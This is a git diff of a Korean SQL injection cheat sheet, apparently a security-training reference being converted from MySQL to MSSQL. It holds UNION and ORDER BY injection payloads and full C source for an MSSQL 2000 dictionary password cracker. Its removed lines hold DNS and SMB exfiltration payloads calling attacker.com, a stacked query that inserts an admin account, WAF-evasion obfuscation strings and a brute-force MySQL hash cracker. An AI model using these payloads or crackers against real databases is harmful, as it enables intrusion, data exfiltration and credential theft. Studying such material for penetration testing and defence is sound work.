@@ -78,11 +78,11 @@ SERVERPROPERTY() 는 MSSQL 2005 이상에서 사용할 수 있음.<br><br><br>
 예 :<br>
 `주어진 쿼리 SELECT username, password, permission FROM Users WHERE id = '1';`<br>&nbsp;
 
-`1' ORDER BY 1--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br>
-`1' ORDER BY 2--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br>
-`1' ORDER BY 3--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br>
-`1' ORDER BY 4--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓 - 쿼리는 3 개의 컬럼만 사용함.`<br>
-`-1' UNION SELECT 1,2,3--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br><br>
+1' ORDER BY 1--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
+1' ORDER BY 2--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
+1' ORDER BY 3--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
+1' ORDER BY 4--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓 - 쿼리는 3 개의 컬럼만 사용함.<br>
+-1' UNION SELECT 1,2,3--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br><br>
 
 노트 :<br>
 거짓 결과값이 출력될 때까지 번호를 계속 증가시킴.<br><br>
@@ -182,7 +182,7 @@ SELECT 'a'+'d'+'mi'+'n';`<br><br><br>
 
 
 
-## (10) 인용 기호 피하기
+## (10) 조건문
 ![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/5a01a082-5220-43b7-912c-a9c3895ce90a)
 <br><br>
 예 :<br>
@@ -293,290 +293,241 @@ MSSQL 은 누적된 쿼리(Stacked Queries)를 지원함.<br><br>
 
 주입을 인코딩하면 WAF/IDS 우회에 유용할 때도 있음.<br><br>
 ![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/72219964-16c4-4aaf-ab4b-0d097aecd1fb)
+<br><br><br>
 
 
+## (17) 패스워드 해싱(Password Hashing)
 
-## (17) 대역 외 채널링
+암호는 0x0100 으로 시작하며 0x 다음에 오는 바이트는 첫 번째는 상수임.<br>
+다음 8 바이트는 해시 Salt 이고 나머지 80 바이트는 2 해시임.<br>
+여기서 첫 번째 40 바이트는 암호의 대/소문자를 구분하는 해시이고 두 번째 40 바이트는 대문자 버전임.<br><br>
+![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/287aad76-e861-406a-be3d-5aa80bd05adc)
+<br><br><br>
 
-**① DNS Requests**<br><br>
 
-1SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\'));1<br><br>
 
-**② SMB Requests**<br><br>
+### (18) 패스워드 크랙(Password Cracking)
 
-`' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`<br><br><br>
-
-
-
-### (18) 누적된 쿼리(Stacked Queries)
-
-누적된 쿼리 기법은 하나의 쿼리에 추가적인 쿼리를 삽입하는 기법임.<br>
-PHP 응용 프로그램이 데이터베이스와 통신하는 데 사용되는 드라이버에 따라 MySQL 에서 가능함.<br>
-PDO_MYSQL 드라이버는 누적된 쿼리(Stacked Queries)를 지원함.<br>
-MySQLi (Improved Extension) 드라이버는 multi_query() 함수를 통해 누적된 쿼리(Stacked Queries)를 지원함.<br><br>
-
-예 :<br>
-`SELECT * FROM Users WHERE ID=1 AND 1=0; INSERT INTO Users(username, password, priv) VALUES ('BobbyTables', 'kl20da$$','admin');`<br>
-`SELECT * FROM Users WHERE ID=1 AND 1=0; SHOW COLUMNS FROM Users;`<br><br><br>
-
-
-
-### (19) MySQL 특정 코드
-
-MySQL 에서는 느낌표 뒤에 버전 번호를 지정할 수 있음.<br>
-주석의 구문은 버전이 지정된 버전 번호보다 크거나 같으면 실행됨.<br><br>
-
-예 :<br>
-`UNION SELECT /*!50000 5,null;*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+`<br>
-`SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);`<br><br>
-
-노트 :<br>
-첫 번째 예제는 버전을 반환함. 2개의 컬럼이 있는 UNION 을 사용함.<br>
-두 번째 예제는 WAF/IDS 를 우회하는데 어떻게 사용되는 지를 보여줌.<br><br><br>
-
-
-
-## (20) 퍼징(Fuzzing)과 난독화(Obfuscation)
-
-**① 허용된 중간 문자열**<br><br>
-
-다음 문자는 공백으로 사용할 수 있음.<br><br>
-
-![스크린샷 2024-04-17 오후 2 31 34](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/6e460be1-4209-415c-b762-5e5ca24c0d0f)<br><br>
-
-
-예 :<br>
-`'%0A%09UNION%0CSELECT%A0NULL%20%23`<br><br>
-
-공백을 사용하지 않으려면 괄호를 사용할 수도 있음.<br><br>
-
-![스크린샷 2024-04-17 오후 2 31 55](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/b1d2f79e-7522-4237-b6d3-54a87f7a67dc)<br><br>
-
-
-예 :<br>
-`UNION(SELECT(column)FROM(table))`<br><br>
-
-**② AND/OR 뒤에 허용되는 중간 문자열**<br><br>
-
-![스크린샷 2024-04-17 오후 2 32 24](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/abb3eb20-9560-4e48-ad81-4dc17033e743)<br><br>
-
-
-예 :<br>
-`SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))`<br><br>
-
-노트 :<br>
-DUAL 테이블은 테스트에 사용할 수 있는 더미 테이블임.<br><br>
-
-**③ 주석으로 난독화**<br><br>
-
-WAF/IDS 를 우회하기 위해 주석을 사용하여 쿼리를 분할할 수 있음.<br>
-<p># 또는 -- 와 같은 개행 문자를 사용하여 쿼리를 별도의 줄로 나눌 수 있음.</p><br><br>
-
-예 :<br>
-`1'#`<br>
-`AND 0--`<br>
-`UNION# I am a comment!`<br>
-`SELECT@tmp:=table_name x FROM--`<br>
-`information_schema`.tables LIMIT 1#`<br><br>
-
-URL 인코딩은 다은과 같이 나타냄 :<br>
-`1'%23%0AAND 0--%0AUNION%23 I am a comment!%0ASELECT@tmp:=table_name x FROM--%0A`information_schema`.tables LIMIT 1%23`<br><br>
-
-특정 함수는 주석과 공백으로 난독화할 수 있음.<br>
-`VERSION/**/%A0 (/*comment*/)`<br><br>
-
-**④ 인코딩**<br><br>
-
-주입을 인코딩하면 WAF/IDS 우회에 유용할 때도 있음.<br><br>
-
-![스크린샷 2024-04-17 오후 2 33 56](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/70bae8cc-b287-4b5f-bd03-a840fdc562b5)<br><br>
-
-
-**⑤ 키워드 피하기**<br><br>
-
-IDS/WAF 가 특정 키워드를 차단하는 경우 인코딩을 사용하지 않고 다른 키워드를 사용하는 방법이 있음.<br><br>
-
-`information_schema.tables`<br><br>
-
-![스크린샷 2024-04-17 오후 2 57 54](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/1101bf45-faee-48ba-a978-9439699e2304)<br><br>
-
-
-노트 :<br>
-대체 이름은 테이블에 있는 PRIMARY 키에 따라 다를 수 있음.<br><br><br>
-
-
-
-## (21) 연산자
-
-![스크린샷 2024-04-17 오후 2 58 37](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/dd796b56-e57d-41af-8846-9601392be528)<br><br><br>
-
-## (22) 상수
-
-![스크린샷 2024-04-17 오후 2 58 59](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e151303f-3b57-4edd-9045-17b423ba14c9)<br><br><br>
-
-
-
-
-## (23) 패스워드 해싱(Password Hashing)
-
-MySQL 4.1 이전 버전에서는 PASSWORD() 함수로 계산된 암호 해시는 16 바이트임.
-이러한 해시는 다음과 같음.<br><br>
-
-![스크린샷 2024-04-17 오후 2 59 22](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/07032ab1-0ae1-4fd4-a718-67b9a8269bec)<br><br>
-
-
-MySQL 4.1 부터 PASSWORD() 함수는 더 긴 41 바이트 해시값으로 생성하도록 수정됨.<br><br>
-![스크린샷 2024-04-17 오후 2 59 37](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/6a3d5fc2-a145-478d-9bdb-10cfbd1e17fe)
-
-
-
-## (24) 패스워드 크랙(Password Cracking)
-
-Cain&Abel 과 John the Ripper 는 모두 MySQL 3.x-6.x 암호를 해독할 수 있음.<br>
 JTR 용 Metasploit 모듈은 아래 링크에서 찾을 수 있음.<br>
-http://www.metasploit.com/modules/auxiliary/analyze/jtr_mysql_fast<br><br>
+http://www.metasploit.com/modules/auxiliary/analyze/jtr_mssql_fast<br><br>
 
-**① MySQL < 4.1 Password Cracker**<br><br>
+**① MSSQL 2000 Password Cracker**<br><br>
 
-아래 코드는 MySQL 해시 암호용 고속 Brute-force 암호 크래커임.<br>
-일반 PC 에서 인쇄 가능한 ASCII 문자가 포함된 8자리 암호를 몇 시간만에 해독할 수 있음.<br><br>
+해당 코드는 Microsoft SQL Server 2000 암호를 해독하도록 설계됨.<br><br>
 
-```/* This program is public domain. Share and enjoy.
-*
-* Example:
-* $ gcc -O2 -fomit-frame-pointer MySQLfast.c -o MySQLfast
-* $ MySQLfast 6294b50f67eda209
-* Hash: 6294b50f67eda209
-* Trying length 3
-* Trying length 4
-* Found pass: barf
-*
-* The MySQL password hash function could be strengthened considerably
-* by:
-* - making two passes over the password
-* - using a bitwise rotate instead of a left shift
-* - causing more arithmetic overflows
-*/
-
+```/////////////////////////////////////////////////////////////////////////////////
+//
+//           SQLCrackCl
+//
+//           This will perform a dictionary attack against the
+//           upper-cased hash for a password. Once this
+//           has been discovered try all case variant to work
+//           out the case sensitive password.
+//
+//           This code was written by David Litchfield to
+//           demonstrate how Microsoft SQL Server 2000
+//           passwords can be attacked. This can be
+//           optimized considerably by not using the CryptoAPI.
+//
+//           (Compile with VC++ and link with advapi32.lib
+//           Ensure the Platform SDK has been installed, too!)
+//
+//////////////////////////////////////////////////////////////////////////////////
 #include <stdio.h>
-
-typedef unsigned long u32;
-
-/* Allowable characters in password; 33-126 is printable ascii */
-#define MIN_CHAR 33
-#define MAX_CHAR 126
-
-/* Maximum length of password */
-#define MAX_LEN 12
-
-#define MASK 0x7fffffffL
-
-int crack0(int stop, u32 targ1, u32 targ2, int *pass_ary)
-{
-  int i, c;
-  u32 d, e, sum, step, diff, div, xor1, xor2, state1, state2;
-  u32 newstate1, newstate2, newstate3;
-  u32 state1_ary[MAX_LEN-2], state2_ary[MAX_LEN-2];
-  u32 xor_ary[MAX_LEN-3], step_ary[MAX_LEN-3];
-  i = -1;
-  sum = 7;
-  state1_ary[0] = 1345345333L;
-  state2_ary[0] = 0x12345671L;
-
-  while (1) {
-    while (i < stop) {
-      i++;
-      pass_ary[i] = MIN_CHAR;
-      step_ary[i] = (state1_ary[i] & 0x3f) + sum;
-      xor_ary[i] = step_ary[i]*MIN_CHAR + (state1_ary[i] << 8);
-      sum += MIN_CHAR;
-      state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
-      state2_ary[i+1] = state2_ary[i]
-        + ((state2_ary[i] << 8) ^ state1_ary[i+1]);
-    }
-
-    state1 = state1_ary[i+1];
-    state2 = state2_ary[i+1];
-    step = (state1 & 0x3f) + sum;
-    xor1 = step*MIN_CHAR + (state1 << 8);
-    xor2 = (state2 << 8) ^ state1;
-
-    for (c = MIN_CHAR; c <= MAX_CHAR; c++, xor1 += step) {
-      newstate2 = state2 + (xor1 ^ xor2);
-      newstate1 = state1 ^ xor1;
-
-      newstate3 = (targ2 - newstate2) ^ (newstate2 << 8);
-      div = (newstate1 & 0x3f) + sum + c;
-      diff = ((newstate3 ^ newstate1) - (newstate1 << 8)) & MASK;
-      if (diff % div != 0) continue;
-      d = diff / div;
-      if (d < MIN_CHAR || d > MAX_CHAR) continue;
-
-      div = (newstate3 & 0x3f) + sum + c + d;
-      diff = ((targ1 ^ newstate3) - (newstate3 << 8)) & MASK;
-      if (diff % div != 0) continue;
-      e = diff / div;
-      if (e < MIN_CHAR || e > MAX_CHAR) continue;
-
-      pass_ary[i+1] = c;
-      pass_ary[i+2] = d;
-      pass_ary[i+3] = e;
-      return 1;
-    }
-
-    while (i >= 0 && pass_ary[i] >= MAX_CHAR) {
-      sum -= MAX_CHAR;
-      i--;
-    }
-    if (i < 0) break;
-    pass_ary[i]++;
-    xor_ary[i] += step_ary[i];
-    sum++;
-    state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
-    state2_ary[i+1] = state2_ary[i]
-      + ((state2_ary[i] << 8) ^ state1_ary[i+1]);
-  }
-
-  return 0;
-}
-
-void crack(char *hash)
-{
-  int i, len;
-  u32 targ1, targ2, targ3;
-  int pass[MAX_LEN];
-
-  if ( sscanf(hash, "%8lx%lx", &targ1, &targ2) != 2 ) {
-    printf("Invalid password hash: %s\n", hash);
-    return;
-  }
-  printf("Hash: %08lx%08lx\n", targ1, targ2);
-  targ3 = targ2 - targ1;
-  targ3 = targ2 - ((targ3 << 8) ^ targ1);
-  targ3 = targ2 - ((targ3 << 8) ^ targ1);
-  targ3 = targ2 - ((targ3 << 8) ^ targ1);
-
-  for (len = 3; len <= MAX_LEN; len++) {
-    printf("Trying length %d\n", len);
-    if ( crack0(len-4, targ1, targ3, pass) ) {
-      printf("Found pass: ");
-      for (i = 0; i < len; i++)
-        putchar(pass[i]);
-      putchar('\n');
-      break;
-    }
-  }
-  if (len > MAX_LEN)
-    printf("Pass not found\n");
-}
-
+#include <windows.h>
+#include <wincrypt.h>
+FILE *fd=NULL;
+char *lerr = "\nLength Error!\n";
+int wd=0;
+int OpenPasswordFile(char *pwdfile);
+int CrackPassword(char *hash);
 int main(int argc, char *argv[])
 {
-  int i;
-  if (argc <= 1)
-    printf("usage: %s hash\n", argv[0]);
-  for (i = 1; i < argc; i++)
-    crack(argv[i]);
+                    int err = 0;
+               if(argc !=3)
+                         {
+                                   printf("\n\n*** SQLCrack *** \n\n");
+                                   printf("C:\\>%s hash passwd-file\n\n",argv[0]);
+                                   printf("David Litchfield (david@ngssoftware.com)\n");
+                                   printf("24th June 2002\n");
+                                   return 0;
+                         }
+               err = OpenPasswordFile(argv[2]);
+               if(err !=0)
+                {
+                  return printf("\nThere was an error opening the password file %s\n",argv[2]);
+                }
+               err = CrackPassword(argv[1]);
+               fclose(fd);
+               printf("\n\n%d",wd);
+               return 0;
+}
+int OpenPasswordFile(char *pwdfile)
+{
+               fd = fopen(pwdfile,"r");
+               if(fd)
+                         return 0;
+               else
+                         return 1;
+}
+int CrackPassword(char *hash)
+{
+               char phash[100]="";
+               char pheader[8]="";
+               char pkey[12]="";
+               char pnorm[44]="";
+               char pucase[44]="";
+               char pucfirst[8]="";
+               char wttf[44]="";
+               char uwttf[100]="";
+               char *wp=NULL;
+               char *ptr=NULL;
+               int cnt = 0;
+               int count = 0;
+               unsigned int key=0;
+               unsigned int t=0;
+               unsigned int address = 0;
+               unsigned char cmp=0;
+               unsigned char x=0;
+               HCRYPTPROV hProv=0;
+               HCRYPTHASH hHash;
+DWORD hl=100;
+unsigned char szhash[100]="";
+int len=0;
+if(strlen(hash) !=94)
+                 {
+                         return printf("\nThe password hash is too short!\n");
+                 }
+if(hash[0]==0x30 && (hash[1]== 'x' || hash[1] == 'X'))
+                 {
+                         hash = hash + 2;
+                         strncpy(pheader,hash,4);
+                         printf("\nHeader\t\t: %s",pheader);
+                         if(strlen(pheader)!=4)
+                                   return printf("%s",lerr);
+                         hash = hash + 4;
+                         strncpy(pkey,hash,8);
+                         printf("\nRand key\t: %s",pkey);
+                         if(strlen(pkey)!=8)
+                                   return printf("%s",lerr);
+                         hash = hash + 8;
+                         strncpy(pnorm,hash,40);
+                         printf("\nNormal\t\t: %s",pnorm);
+                         if(strlen(pnorm)!=40)
+                                   return printf("%s",lerr);
+                         hash = hash + 40;
+                         strncpy(pucase,hash,40);
+                         printf("\nUpper Case\t: %s",pucase);
+                         if(strlen(pucase)!=40)
+                                   return printf("%s",lerr);
+                         strncpy(pucfirst,pucase,2);
+                         sscanf(pucfirst,"%x",&cmp);
+                 }
+else
+                 {
+                         return printf("The password hash has an invalid format!\n");
+                 }
+printf("\n\n       Trying...\n");
+if(!CryptAcquireContextW(&hProv, NULL , NULL , PROV_RSA_FULL                 ,0))
+  {
+                 if(GetLastError()==NTE_BAD_KEYSET)
+                         {
+                                   // KeySet does not exist. So create a new keyset
+                                   if(!CryptAcquireContext(&hProv,
+                                                        NULL,
+                                                        NULL,
+                                                        PROV_RSA_FULL,
+                                                        CRYPT_NEWKEYSET ))
+                                      {
+                                               printf("FAILLLLLLL!!!");
+                                               return FALSE;
+                                      }
+                  }
+}
+while(1)
+                {
+                  // get a word to try from the file
+                  ZeroMemory(wttf,44);
+                  if(!fgets(wttf,40,fd))
+                     return printf("\nEnd of password file. Didn't find the password.\n");
+                  wd++;
+                  len = strlen(wttf);
+                  wttf[len-1]=0x00;
+                  ZeroMemory(uwttf,84);
+                  // Convert the word to UNICODE
+                  while(count < len)
+                            {
+                                      uwttf[cnt]=wttf[count];
+                                      cnt++;
+                                      uwttf[cnt]=0x00;
+                                      count++;
+                                      cnt++;
+                            }
+                  len --;
+                  wp = &uwttf;
+                  sscanf(pkey,"%x",&key);
+                  cnt = cnt - 2;
+                  // Append the random stuff to the end of
+                  // the uppercase unicode password
+                  t = key >> 24;
+                  x = (unsigned char) t;
+                  uwttf[cnt]=x;
+                  cnt++;
+                  t = key << 8;
+                  t = t >> 24;
+                x = (unsigned char) t;
+                uwttf[cnt]=x;
+                cnt++;
+                t = key << 16;
+                t = t >> 24;
+                x = (unsigned char) t;
+                uwttf[cnt]=x;
+                cnt++;
+                t = key << 24;
+                t = t >> 24;
+                x = (unsigned char) t;
+                uwttf[cnt]=x;
+                cnt++;
+// Create the hash
+if(!CryptCreateHash(hProv, CALG_SHA, 0 , 0, &hHash))
+                {
+                          printf("Error %x during CryptCreatHash!\n", GetLastError());
+                          return 0;
+                }
+if(!CryptHashData(hHash, (BYTE *)uwttf, len*2+4, 0))
+                {
+                          printf("Error %x during CryptHashData!\n", GetLastError());
+                          return FALSE;
+                }
+CryptGetHashParam(hHash,HP_HASHVAL,(byte*)szhash,&hl,0);
+// Test the first byte only. Much quicker.
+if(szhash[0] == cmp)
+                {
+                          // If first byte matches try the rest
+                          ptr = pucase;
+                          cnt = 1;
+                          while(cnt < 20)
+                          {
+                                      ptr = ptr + 2;
+                                      strncpy(pucfirst,ptr,2);
+                                      sscanf(pucfirst,"%x",&cmp);
+                                      if(szhash[cnt]==cmp)
+                                               cnt ++;
+                                      else
+                                      {
+                                               break;
+                                      }
+                          }
+                          if(cnt == 20)
+                          {
+                               // We've found the password
+                               printf("\nA MATCH!!! Password is %s\n",wttf);
+                               return 0;
+                            }
+                    }
+                    count = 0;
+                    cnt=0;
+                  }
   return 0;
 }
 ```
